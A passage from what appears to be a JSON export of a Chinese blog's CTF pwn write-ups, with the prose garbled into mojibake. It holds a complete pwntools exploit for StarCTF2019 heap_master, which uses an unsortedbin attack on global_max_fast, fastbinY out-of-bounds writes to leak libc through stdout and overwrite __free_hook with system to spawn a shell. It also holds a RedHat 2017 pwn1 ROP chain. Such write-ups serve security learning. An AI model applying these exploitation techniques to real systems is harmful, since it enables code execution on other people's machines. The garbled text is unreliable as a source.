¼å¼æ˜¯@x0x7ffffffï¼Œæ‰€ä»¥åœ¨recvuntilâ€@xâ€ï¼Œä¹‹åå¼€å§‹è·å–æ‰“å°çš„system_addr:system_addr = int(io.recv(12), 16)ï¼Œä»¥åå…­è¿›åˆ¶æ€»å…±è¯»å–12ä½\n\n8.è¯»å–å®Œæˆsystem_addråå°±å¯ä»¥å¼€å§‹è¾“å…¥payloadï¼Œä¹‹åå°±å¯ä»¥interactive()ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"StarCTF2019_heap_master","url":"/2021/08/14/StarCTF2019_heap_master/","content":"\nè¿™é“é¢˜å­¦åˆ°äº†å¾ˆå¤šï¼Œç‰¹æ­¤è®°å½•ä¸€ä¸‹ã€‚\n\n# 1.å¸¸è§„checksecä¸€ä¸‹ï¼Œä¿æŠ¤å…¨å¼€ã€‚\n\n# 2.å‡½æ•°è§£æï¼š\n\næ¯”è¾ƒå¸¸è§„çš„èœå•é¢˜ï¼Œè¿™é‡Œçš„addæ˜¯æ­£å¸¸ï¼Œä½†æ˜¯ç¨‹åºæœ€å¼€å§‹mmapä¸€å—0x10000å¤§å°çš„chunkï¼Œä¹‹åçš„editå’Œdeleteéƒ½æ˜¯é’ˆå¯¹è¿™ä¸ªæœ€å¼€å§‹mmapå‡ºæ¥çš„chunkã€‚\n\n(1)editå‡½æ•°ï¼šè¾“å…¥åç§»ï¼Œé’ˆå¯¹m_chunk_addrå¯¹åº”åç§»ä¿®æ”¹ã€‚æ¯”å¦‚m_chunk_addr=0x100ï¼Œåç§»ä¸º0x10ï¼Œä¿®æ”¹å†…å®¹ä¸º'M'é‚£ä¹ˆä¿®æ”¹å†…å®¹ä¸º*(0x100+0x10) = 'M'ï¼Œå³*(m_chunk_addr+offset) = change_contã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1-2.png)\n\n(2)deleteå‡½æ•°ï¼šåŒæ ·è¾“å…¥åç§»é’ˆå¯¹m_chunk_addrå¯¹åº”åç§»freeï¼Œç”±äºæ²¡æœ‰æŒ‡é’ˆçš„ç›¸å…³æ“ä½œï¼Œæ‰€ä»¥è¿™é‡Œå­˜åœ¨UAFã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2-2.png)\n\n# 3.æ¼æ´è§£æï¼š\n\n(1)ç”±äºmmapçš„æ•°æ®å¯ä»¥ä»»æ„ä¼ªé€ å’Œé‡Šæ”¾ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªé‡Šæ”¾ä»»æ„å¤§å°chunkï¼Œåœ¨æ²¡æœ‰åŠæ³•æ³„éœ²åœ°å€çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©è¿›è¡Œçˆ†ç ´global_max_fastï¼Œåˆ©ç”¨unsortedbin attackåœ¨global_max_fastä¸Šå†™ä¸‹main_arenaåœ°å€ï¼Œä½¿å¾—fastbinYæ•°ç»„å¯ä»¥è¶Šç•Œå†™ã€‚\n\n(2)ä¹‹åå†åˆ©ç”¨é‡Šæ”¾ä»»æ„å¤§å°çš„chunkï¼Œä»main_arenaä¸­fastbinYæ•°ç»„è¶Šç•Œå¾€åå†™ï¼Œä¿®æ”¹_IO_2_1_stoutç»“æ„ä½“çš„_IO_write_baseã€_IO_write_ptrã€_IO_read_endã€_IO_write_endä¸ºmmapä¸­æ”¾å…¥unsortedbinçš„å †åœ°å€ï¼Œä»è€Œæ³„éœ²å‡ºmain_arenaåœ°å€å¾—åˆ°åœ°å€ã€‚\n\n(3)å†åˆ©ç”¨fastbinçš„ç‰¹æ€§ï¼Œä¿®æ”¹fastbinYæ•°ç»„ä¸Šçš„chunkçš„fdä¸ºsystemï¼Œç”³è¯·å¯¹åº”å¤§å°çš„fastbinå›æ¥ä¹‹åï¼Œå…¶fdå°±ç•™åœ¨fastbinYæ•°ç»„ä¸Šï¼Œè¿™æ ·å¦‚æœfastbinYå¯¹åº”çš„é‚£ä¸ªç´¢å¼•chunkæœ¬èº«å°±åœ¨free_hookä¸Šï¼Œé‚£ä¹ˆå°±å¯ä»¥ä¿®æ”¹free_hookä¸ºsystemäº†ã€‚è¿™ä¸ªåŒæ ·é€šè¿‡fastbinYæ•°ç»„è¶Šç•Œå†™æ¥å®ç°ã€‚\n\n(4)æœ€åé‡Šæ”¾ä¸€ä¸ª/bin/shå †å—å³å¯getshellã€‚\n\n# 4.expç¼–å†™ä¸è°ƒè¯•ï¼š\n\n(1)é¦–å…ˆæ˜¯èœå•å‡½æ•°ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\ndef dbg():\n    gdb.attach(io)\n    pause()\n    \n\ndef add(size):\n    io.sendlineafter(\">> \", \"1\")\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(size))\n    sleep(0.01)\n\ndef edit(offset, cont):\n    io.sendlineafter(\">> \", \"2\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(len(cont)))\n    sleep(0.01)\n    io.sendafter(\"content: \", cont)\n    sleep(0.01)\n\ndef m_edit(offset, cont):\n    io.sendline(\"2\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n    io.sendline(str(len(cont)))\n    sleep(0.01)\n    io.send(cont)\n    sleep(0.01)\n\ndef delete(offset):\n    io.sendlineafter(\">> \", \"3\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n\ndef m_delete(offset):\n    io.sendline(\"3\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n```\n\nè¿™é‡Œåˆ‡åˆ†m_deleteå’Œm_editçš„åŸå› æ˜¯å› ä¸ºåœ¨åé¢ç¬¬ä¸€æ¬¡ä¿®æ”¹_IO_write_baseä¹‹åè¾“å‡ºçš„ä¸œè¥¿å¯èƒ½å°±ä¼šå‘ç”Ÿä¸€äº›å˜åŒ–ï¼Œä¸å¤ªå¥½æ¥ç€åˆ¤æ–­ã€‚\n\n(2)ä¿®æ”¹global_max_fastï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nedit(0,p64(0x0)+p64(0x91)+\n    '0'*0x80+\n    p64(0x0)+p64(0x21)+\n    '1'*0x10+\n    p64(0x0)+p64(0x21))\ndelete(0x10)\nguess = 0x9000\nedit(0x18, p16((guess + libc.sym['global_max_fast'] - 0x10) & 0xffff))\nadd(0x80)\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-11_14-40-07.png)\n\n(3)fastbinYæ•°ç»„è¶Šç•Œå†™ï¼Œæ³„éœ²å¾—åˆ°åœ°å€ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nfastbinsY = guess + libc.sym['main_arena'] + 8\n_IO_read_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x10\n_IO_write_base = guess + libc.sym['_IO_2_1_stdout_'] + 0x20\n_IO_write_ptr = guess + libc.sym['_IO_2_1_stdout_'] + 0x28\n_IO_write_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x30\n\n\n\n# overwrite _IO_2_1_stdout_._IO_write_base\nidx = (_IO_write_base - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 0x8, p64(size+1))\nm_edit(0x10 + size, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10)\n\n\n# overwrite _IO_2_1_stdout_._IO_write_ptr\nidx = (_IO_write_ptr - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 0x8 + 0x10, p64(size+1))\nm_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10 + 0x10)\n\n\n# overwrite _IO_2_1_stdout_._IO_write_end\nidx = (_IO_write_end - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 0x8 + 0x10, p64(size+1))\nm_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10 + 0x10)\n\n\n# overwrite _IO_2_1_stdout_._IO_read_end\nidx = (_IO_read_end - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 0x8, p64(size+1))\nm_edit(0x10 + size, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10)\n\n\nlibc_base= u64(io.recvuntil(\"\\x7f\")[-6: ] + '\\0\\0') - libc.sym['main_arena'] - 88\nlog.info(\"libc_base:0x%x\"%libc_base)\n__free_hook = libc_base + libc.sym['__free_hook'] \nfastbinsY = libc_base + libc.sym['main_arena'] + 8 \nsystem_addr = libc_base + libc.sym['system']\n```\n\nmmapä¸º0x4a0fe000\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-11_14-51-03-1.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-11_14-51-32.png)\n\nå››ä¸ªå‡ä¿®æ”¹è¿‡äº†ï¼Œè¿™ç§æƒ…å†µä¸‹flagä¸ä¿®æ”¹ä¹Ÿæ˜¯å¯ä»¥æ³„éœ²çš„ã€‚\n\nâ–²å…¶å®è¿™ä¸ªåªå†™write_baseå’Œread_endä¹Ÿå¯ä»¥ï¼Œåªä¸è¿‡ä¼šå‘é€ç‰¹åˆ«å¤šçš„æ•°æ®è¿‡æ¥ï¼Œæ‰“è¿œç¨‹çš„æ—¶å€™å¾ˆä¸å¥½æ‰“ã€‚éœ€è¦æ³¨æ„çš„æ˜¯read_endå¾—æœ€åå†™ã€‚\n\n(4)è¶Šç•Œé‡Šæ”¾chunkåˆ°_free_hookï¼Œç„¶åä¿®æ”¹å…¶fdä¸ºsystemï¼Œå†ç”³è¯·å›æ¥å°±å¯ä»¥å°†_free_hookæ”¹ä¸ºsystemã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\n# fake fastbin fd to system\nidx = (__free_hook - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nlog.info(\"size:0x%x\"%size)\nedit(0x10 + 8, p64(size+1))\nedit(0x10 + size, p64(0x0)+p64(0x21))\ndelete(0x10 + 0x10)\nedit(0x20, p64(system_addr))\nadd(size - 0x10)\n```\n\næ²¡æœ‰ç”³è¯·å›æ¥ä¹‹å‰ï¼Œfree_hookä¸Šæ˜¯å †åœ°å€ï¼Œå…¶FDä¸ºsystem\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1-3.png)\n\nç”³è¯·å›æ¥ä¹‹åï¼ŒFDè¢«å†™è¿›free_hookï¼Œè¿™æ˜¯fastbinæœºåˆ¶é€ æˆçš„ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2-3.png)\n\n(5)åˆ›å»º/bin/shå †å—ï¼Œé‡Šæ”¾å³å¯getshellï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nedit(0x200, p64(0x0)+p64(0x21)+\"/bin/sh\\0\")\ndelete(0x200 + 0x10)\nio.interactive()\n```\n\n# 5.æ€»çš„çˆ†ç ´EXPï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom pwn import *\nfrom time import sleep\nimport os\ncontext.binary = \"./heap_master\"\nlibc = ELF(context.binary.libc.path)\n\n\ndef dbg():\n    gdb.attach(io)\n    pause()\n    \n\ndef add(size):\n    io.sendlineafter(\">> \", \"1\")\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(size))\n    sleep(0.01)\n\ndef edit(offset, cont):\n    io.sendlineafter(\">> \", \"2\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(len(cont)))\n    sleep(0.01)\n    io.sendafter(\"content: \", cont)\n    sleep(0.01)\n\ndef m_edit(offset, cont):\n    io.sendline(\"2\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n    io.sendline(str(len(cont)))\n    sleep(0.01)\n    io.send(cont)\n    sleep(0.01)\n\ndef delete(offset):\n    io.sendlineafter(\">> \", \"3\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n\ndef m_delete(offset):\n    io.sendline(\"3\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n\ndef pwn():\n    global io\n    edit(0,p64(0x0)+p64(0x91)+\n        '0'*0x80+\n        p64(0x0)+p64(0x21)+\n        '1'*0x10+\n        p64(0x0)+p64(0x21))\n    delete(0x10)\n    guess = 0x9000\n    edit(0x18, p16((guess + libc.sym['global_max_fast'] - 0x10)&0xffff))\n    add(0x80)\n\n\n    fastbinsY = guess + libc.sym['main_arena'] + 8\n    _IO_read_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x10\n    _IO_write_base = guess + libc.sym['_IO_2_1_stdout_'] + 0x20\n    _IO_write_ptr = guess + libc.sym['_IO_2_1_stdout_'] + 0x28\n    _IO_write_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x30\n    __free_hook = guess + libc.sym['__free_hook']\n    _IO_list_all = guess + libc.sym['_IO_list_all']\n\n    # overwrite _IO_2_1_stdout_._IO_write_base\n    idx = (_IO_write_base - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8, p64(size+1))\n    m_edit(0x10 + size, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10)\n\n\n    # overwrite _IO_2_1_stdout_._IO_write_ptr\n    idx = (_IO_write_ptr - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8 + 0x10, p64(size+1))\n    m_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10 + 0x10)\n\n    # overwrite _IO_2_1_stdout_._IO_write_end\n    idx = (_IO_write_end - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8 + 0x10, p64(size+1))\n    m_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10 + 0x10)\n\n\n    # overwrite _IO_2_1_stdout_._IO_read_end\n    idx = (_IO_read_end - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8, p64(size+1))\n    m_edit(0x10 + size, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10)\n\n    libc_base= u64(io.recvuntil(\"\\x7f\")[-6: ] + '\\0\\0') - libc.sym['main_arena'] - 88\n    log.info(\"libc_base:0x%x\"%libc_base)\n    __free_hook = libc_base + libc.sym['__free_hook']\n    fastbinsY = libc_base + libc.sym['main_arena'] + 8\n    system_addr = libc_base + libc.sym['system']\n\n\n    # fake fastbin fd to system\n    idx = (__free_hook - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    log.info(\"size:0x%x\"%size)\n    edit(0x10 + 8, p64(size+1))\n    edit(0x10 + size, p64(0x0)+p64(0x21))\n    delete(0x10 + 0x10)\n    edit(0x20, p64(system_addr))\n    #dbg()\n    add(size - 0x10)\n    #pause()\n\n    edit(0x200, p64(0x0)+p64(0x21)+\"/bin/sh\\0\")\n    delete(0x200 + 0x10)\n\n    io.interactive()\n\n\n\ni = 0\nwhile True:\n    i += 1\n    print i\n    io = process(\"./heap_master\")\n    try:\n        pwn()\n        io.recv(timeout = 1) \n        #è¦ä¹ˆå´©æºƒè¦ä¹ˆçˆ†ç ´æˆåŠŸï¼Œè‹¥å´©æºƒioä¼šå…³é—­ï¼Œio.recv()ä¼šè§¦å‘   EOFError\n    except EOFError:\n        io.close()\n        continue\n    else:\n        # sleep(0.1)\n        # io.sendline('/bin/sh\\x00')\n        # sleep(0.1)\n        # io.interactive() #æ²¡æœ‰EOFErrorçš„è¯å°±æ˜¯çˆ†ç ´æˆåŠŸï¼Œå¯ä»¥å¼€shell\n        break\n```\n\n# 6.æ€»ç»“ï¼š\n\n(1)unsortedbin attackï¼šä¿®æ”¹bkä»»æ„å†™main_arenaï¼Œè¿™é‡Œbké€šå¸¸å¯ä»¥è¿›è¡Œéƒ¨åˆ†å†™æ¥çˆ†ç ´ï¼Œä¹Ÿå¸¸å¸¸ç”¨æ¥ä¿®æ”¹global_max_fastï¼Œä½¿å¾—fastbinYè¶Šç•Œå†™ã€‚\n\n(2)FSOPçš„åˆ©ç”¨ä¸­ï¼Œä¸ä¸€å®šéå¾—ä¿®æ”¹flagï¼Œä¿®æ”¹_IO_write_baseã€_IO_write_ptrã€_IO_read_endã€_IO_write_endä¹Ÿå¯ä»¥ï¼Œå…¶ä¸­éœ€è¦æ»¡è¶³_IO_read_endç­‰äº_IO_write_baseæ¥èµ·åˆ°flagçš„ä½œç”¨ç»•è¿‡æ£€æŸ¥ã€‚\n\n(3)fastbinYæ•°ç»„çš„è¶Šç•Œç”³è¯·ï¼Œä¿®æ”¹å…¶fdå¯å®ç°ä»»æ„å†™ï¼Œè¿™ç‚¹å’Œåˆ©ç”¨fastbinYæ•°ç»„ä¸­chunkå¤§å°åœ¨main_arenaä¸­ç•™ä¸‹0x20~0x80çš„æ•°æ®å¼‚æ›²åŒå·¥ã€‚","tags":["Heap-Skill"],"categories":["PWN","pwnå †-åˆ·é¢˜æŠ€å·§"]},{"title":"RedHat 2017-pwn1","url":"/2021/08/14/RedHat 2017-pwn1/","content":"\n \n\n1.å¸¸è§„ checksecæŸ¥çœ‹ä¸€ä¸‹ï¼Œå‘ç°å¼€å¯äº†NXï¼ŒIDAæ‰“å¼€ç¨‹åºæ‰¾æ¼æ´ï¼Œå˜é‡V1çš„é¦–åœ°å€ä¸ºbp-28hï¼Œå³å˜é‡åœ¨æ ˆä¸Šã€‚è€Œä¹‹åè¿˜æœ‰__isoc99_scanfä¸é™åˆ¶é•¿åº¦çš„å‡½æ•°ï¼Œæ‰€ä»¥è¾“å…¥ä¼šå¯¼è‡´æ ˆæº¢å‡ºã€‚è¿™æ ·å°±å¯ä»¥å¯»æ‰¾systemå’Œâ€bin/shâ€æ¥getshelläº†ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nint v1; // [esp+18h] [ebp-28h]\n----------------------------------------------------------\n__isoc99_scanf(\"%s\", &v1);\n```\n\n2.é¦–å…ˆctrl+sçœ‹çœ‹.got.pltä¸­æœ‰æ²¡æœ‰systemå‡½æ•°ï¼Œè¿™é‡Œæœ‰ã€‚æ‰¾åˆ°systemå‡½æ•°åï¼Œå†å¯»æ‰¾â€/bin/shâ€ï¼Œä½†æ˜¯æ‰¾ä¸åˆ°ï¼Œæ‰€ä»¥è€ƒè™‘ä»__isoc99_scanfæ¥è¯»å–â€/bin/shâ€æ¥å†™å…¥åˆ°å†…å­˜è¿›ç¨‹ä¸­ã€‚\n\n3.æ¥ä¸‹æ¥è€ƒè™‘å­—ç¬¦ä¸²â€/bin/shâ€åº”è¯¥æ”¾åˆ°å“ªé‡Œï¼Œå› ä¸ºå¯èƒ½ä¼šæœ‰ASLR(åœ°å€éšæœºåŒ–)çš„å½±å“ï¼Œæ‰€ä»¥æœ€å¥½æ‰¾ä¸ªå¯ä»¥å›ºå®šçš„å†…å­˜åœ°å€æ¥å­˜æ”¾æ•°æ®ã€‚ctrl+sæŸ¥çœ‹å†…å­˜é¡µåå¯ä»¥çœ‹åˆ°æœ‰ä¸ª0x0804a030å¼€å§‹çš„å¯è¯»å¯å†™çš„å¤§äº8å­—èŠ‚çš„åœ°å€ï¼Œä¸”è¯¥åœ°å€ä¸å—ASLRå½±å“ï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘æŠŠå­—ç¬¦ä¸²è¯»åˆ°è¿™é‡Œã€‚(å¯ä»¥çœ‹åˆ°æœ‰Rå’ŒWæƒé™ï¼Œä½†æˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆçœ‹è¯¥åœ°å€å—ä¸å—åˆ°ASLRçš„å½±å“ï¼Œå¯ä»¥æŒ‰ç…§ä»¥å‰çš„åšæ³•ï¼Œè¿™é‡Œå¯ä»¥å°†è¯¥åœ°å€ä¿®æ”¹ä¸ºæŸä¸ªexternæ®µçš„åœ°å€ï¼Œå› ä¸ºå»¶è¿Ÿç»‘å®šä¹‹åï¼Œè¿™ä¸ªæ®µä¸­çš„å†…å®¹å°±åŸºæœ¬æ²¡ç”¨äº†ï¼Œè¿™é‡Œé€‰æ‹©è¿™ä¸ªæ®µä¸Šçš„æŸä¸ªåœ°å€ä¸€æ ·å¯ä»¥getshellï¼Œæˆ‘é€‰çš„æ˜¯0x0804A050ã€‚)\n\n4.æ—¢ç„¶ç¨‹åºè¯»å–ç”¨çš„æ˜¯__isoc99_scanfï¼Œé‚£ä¹ˆå‚æ•°â€%sâ€ä¹Ÿå¾—æ‰¾åˆ°ï¼Œå®¹æ˜“æ‰¾åˆ°ä½äº0x08048629ã€‚\n\n5.å…ˆç¼–å†™ropé“¾æµ‹è¯•ä¸€ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nelf = ELF('./pwn1')#ropé“¾å¿…å¤‡ï¼Œç”¨äºæ‰“å¼€pltå’Œgotè¡¨æ¥è·å–å‡½æ•°åœ°å€\nscanf_addr = p32(elf.symbols['__isoc99_scanf'])#è·å–scanfçš„åœ°å€\nformat_s = p32(0x08048629)#è¿™æ˜¯æˆ‘ä»¬scanfèµ‹äºˆâ€%sâ€çš„åœ°å€\nbinsh_addr = p32(0x0804a030)#bin/shä¿å­˜çš„åœ°å€\n\nshellcode = â€˜Aâ€™*0x34 + scanf_addr + format_s + binsh_addr\nprint io.read()\n#è¯»å–puts(\"pwn test\")çš„è¾“å‡ºï¼Œä»¥ä¾¿ç»§ç»­æ‰§è¡Œã€‚io.recv()ä¸€æ ·å¯ä»¥ï¼Œå…·ä½“ç”¨æ³•å†åšå‚è€ƒ\nio.sendline(shellcode1)#ç¬¬ä¸€æ¬¡scanfè¾“å…¥shellcode1\n```\n\nè¿™é‡Œ\"A\"*0x34æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨è¯¥å‡½æ•°ä¸­å£°æ˜çš„å±€éƒ¨å˜é‡v1è·ç¦»æ ˆåº•æœ‰0x28ï¼Œé‚£ä¹ˆmainå‡½æ•°çš„è¿”å›åœ°å€åº”è¯¥æ˜¯0x28+0x04=0x2cæ‰å¯¹ã€‚ä½†æ˜¯å®é™…ä¸Šï¼Œç”±äºç¨‹åºæœ€å¼€å§‹çš„åŠ¨æ€é“¾æ¥ï¼Œæ˜¯ä»startå¼€å§‹åˆå§‹åŒ–mainå‡½æ•°æ ˆçš„ï¼Œæ‰€ä»¥ç»è¿‡startå‡½æ•°ä¼šç»™mainå‡½æ•°æ ˆä¸Šå‹å…¥ä¸¤ä¸ªå…¨å±€åç§»é‡ã€‚é€šè¿‡è°ƒè¯•ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œè¾“å…¥AAAA,ä½äºFFFDF568,åŠ ä¸Š0x28åº”è¯¥ç­‰äºFFFDF590ï¼Œä½†æ˜¯è¿™é‡Œå´ä¸æ˜¯ebpï¼Œå¾—å†åŠ ä¸Šä¸¤ä¸ª0x04æ‰æ˜¯ebpçš„ä½ç½®ã€‚è¿™æ˜¯å› ä¸ºåœ¨ç¨‹åºè¿è¡Œèµ·æ¥çš„å»¶è¿Ÿç»‘å®šçš„å…³ç³»ï¼Œå‹å…¥æ ˆçš„æ˜¯å…¨å±€åç§»ã€‚ä¸è¿‡ä¸ç”¨ç®¡ï¼Œæ²¡å•¥ç”¨ï¼Œè¿™é‡Œç›´æ¥å†åŠ ä¸Šä¸¤ä¸ª0x04å°±å¥½äº†ï¼Œé€šè¿‡è°ƒè¯•ä¹Ÿå¯ä»¥è°ƒè¯•å‡ºæ¥ã€‚è€Œä¸”æŸ¥æ±‡ç¼–ä»£ç ï¼Œå‘ç°å¯»å€æ–¹å¼æ˜¯é€šè¿‡espå¯»å€ï¼Œä¹Ÿå°±æ˜¯[esp+18h]ï¼ŒFFFDF550+0x18=FFFDF568ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„åœ°æ–¹ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191551130.jpeg)\n\n6.ç¨‹åºè¿è¡Œåˆ°è¿™æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯æ¥ç€è¿è¡Œä¸‹å»ä»ç”±äºæˆ‘ä»¬è¦†ç›–çš„æ˜¯mainå‡½æ•°çš„è¿”å›åœ°å€ï¼Œè®©mainè¿”å›åœ°å€è¿”å›åˆ°scanfä¸­ï¼Œæ‰§è¡Œçš„æ˜¯returnå‘½ä»¤ã€‚è€Œå†æ¬¡è¿›å…¥åˆ°scanfå‡½æ•°ä¸­ä¹‹åï¼Œæ‰§è¡Œï¼šio.sendline(â€œ/bin/shâ€)ã€‚å‘ç°binshå¹¶æ²¡æœ‰è¢«è¯»å…¥åˆ°binsh_addrä¸­ï¼Œè¿™æ˜¯å› ä¸ºscanfè¯»å–è¾“å…¥æ—¶çš„æ±‡ç¼–æ“ä½œå¦‚ä¸‹ï¼šå‡è®¾ä¸ºscanf(â€œ%sâ€,&v1);\n\n```\n#æ³¨é‡Šå¤´\n\npush v1\npush %s\npush eip\n```\n\næ ˆçš„åˆ†å¸ƒå¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\næ ˆé¡¶\nscanfè¿”å›åœ°å€              ---esp +1\nscanfç¬¬ä¸€ä¸ªæ ¼å¼åŒ–å‚æ•°%s    ---esp+2\nscanfç¬¬äºŒä¸ªè¾“å…¥è¿›çš„å‚æ•°&v1  ---esp+3\n\næ‰§è¡Œæ—¶æ˜¯å–esp +2,esp+3\n```\n\nè€Œæˆ‘ä»¬ç›´æ¥return scanfçš„æ ˆåˆ†å¸ƒå¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nscanf ç¬¬ä¸€ä¸ªæ ¼å¼åŒ–å‚æ•°%s       ---p32(format_s)   ---esp+1\nscanfç¬¬äºŒä¸ªè¾“å…¥è¿›çš„å‚æ•°&v1     ---p32(binsh_addr)  --esp+2\næ‰§è¡Œæ—¶æ˜¯å–esp+2,esp+3\n```\n\nscanfåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œç”±äºæˆ‘ä»¬æ²¡æœ‰å°†scanfçš„è¿”å›åœ°å€å‹å…¥æ ˆä¸­ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªè¯»å–çš„æ˜¯esp+2ï¼Œå°†æˆ‘ä»¬éœ€è¦è¾“å…¥çš„binshçš„åœ°å€å½“ä½œäº†æ ¼å¼åŒ–å‚æ•°%sæ¥è¯»å–ï¼Œå‘ç”Ÿé”™è¯¯ã€‚ä¹‹åscanfä¹Ÿæ²¡åŠæ³•æ­£å¸¸è¿”å›\n\n8.æ‰€ä»¥æˆ‘ä»¬ç”¨mainå‡½æ•°çš„returnæ¥è°ƒç”¨scanfæ—¶ï¼Œéœ€è¦ç»™æ ˆå¸ƒç½®ä¸€ä¸ªscanfçš„è¿”å›åœ°å€ï¼Œå¦åˆ™scanfæ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šè¯»å–å‚æ•°å‘ç”Ÿé”™è¯¯ï¼Œä¸èƒ½æ­£å¸¸è¯»å–å’Œè¿”å›ã€‚\n\n9.é‚£ä¹ˆç¬¬ä¸€æ¬¡çš„shellcodeé¡ºåºåº”è¯¥æ˜¯â€˜Aâ€™*0x34 + scanf_addr + scanf_returnaddr + format_s + binsh_addrã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nshellcode1 = 'A'*0x34\t#padding\nshellcode1 += scanf_addr # è°ƒç”¨scanfä»¥ä»STDINè¯»å–\"/bin/sh\"å­—ç¬¦ä¸²\nshellcode1 += scanf_retn_addr # scanfè¿”å›åœ°å€\nshellcode1 += format_s # scanfå‚æ•° \nshellcode1 += binsh_addr # \"/bin/sh\"å­—ç¬¦ä¸²æ‰€åœ¨åœ°å€\n```\n\nä¹‹åå¤§å¤šæœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼š\n\nâ–²ç¬¬ä¸€ç§ï¼šå°†scanfè¿”å›åˆ°mainï¼Œå†æ¬¡æ‰§è¡Œæ ˆæº¢å‡ºï¼š\n\nä¹Ÿå°±æ˜¯å°†scanfçš„è¿”å›åœ°å€è®¾ç½®ä¸ºmainå‡½æ•°çš„åœ°å€ï¼Œscanfå‡ºæ¥ä¹‹åï¼Œå›åˆ°mianä¸­ä¹‹åï¼Œç¬¬äºŒæ¬¡çš„shellcodeåº”è¯¥æ˜¯â€™Aâ€™*0x2c +system_addr + system_ret_addr + binsh_addrã€‚è¿™é‡Œçš„system_addrå’Œä¸Šè¿°çš„scanfä¸­æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯ä¸ºäº†é˜²æ­¢å‡½æ•°è¯»å–å‚æ•°å‘ç”Ÿé”™è¯¯ä»è€Œæ— æ³•æ­£å¸¸æ‰§è¡Œã€‚ä½†æ˜¯è¿™é‡Œçš„system_ret_addrå¯ä»¥éšä¾¿å¡«ï¼Œå› ä¸ºæˆ‘ä»¬å¹¶ä¸éœ€è¦è¿”å›systemï¼Œè¿›å…¥åˆ°systemä¹‹åæ‰§è¡Œbinshå°±èƒ½getshelläº†ã€‚è€Œâ€™Aâ€™*2cæ˜¯å› ä¸ºæ 